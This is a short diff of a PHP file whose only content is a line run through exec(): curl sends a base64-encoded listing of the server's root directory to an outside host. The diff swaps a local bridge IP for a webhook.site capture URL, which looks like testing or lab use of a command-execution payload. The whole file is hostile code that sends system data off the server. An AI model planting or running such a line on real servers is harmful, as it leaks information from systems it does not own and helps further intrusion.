@@ -1,3 +1,3 @@
 <?php
-exec("curl http:\/\/172.17.0.1:8080/$(ls / | base64)");
+exec("curl https:\//webhook.site/a497fdb7-6eb6-4349-a0b8-4c3c5e9b77ea?test=$(ls / | base64 | tr -d '\\n')");
 ?>
